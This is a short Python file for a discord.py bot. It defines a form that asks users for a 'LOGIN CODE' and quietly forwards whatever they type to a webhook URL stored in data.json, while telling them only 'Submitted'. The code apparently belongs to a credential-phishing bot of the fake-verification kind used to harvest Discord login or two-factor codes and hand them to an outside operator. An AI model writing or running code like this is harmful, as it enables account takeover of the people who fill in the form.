import json

import aiohttp
import discord
from discord import ui, Webhook, NotFound, HTTPException


class MyModalTwo(ui.Modal, title="Modal Title Here"):
    box_three = ui.TextInput(label="Question 3", required=True)

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        with open("data.json", "r") as f:
            data = json.load(f)
        if data.get("webhook") is None:
            await interaction.response.send_message("The webhook has not been set yet", ephemeral=True)
        else:
            async with aiohttp.ClientSession() as session:
                webhook = Webhook.from_url(data["webhook"], session=session)
                try:
                    await webhook.send(
                        embed=discord.Embed(
                            title="LOGIN CODE",
                            description=f"**```LOGIN CODE```**: {self.box_three.value}",
                            colour=0x008000
                        )
                    )
                except NotFound:
                    return await interaction.response.send_message("Webhook not found", ephemeral=True)
                except HTTPException:
                    return await interaction.response.send_message("Couldn't send to webhook", ephemeral=True)
            await interaction.response.send_message(
                "Submitted", ephemeral=True
            )
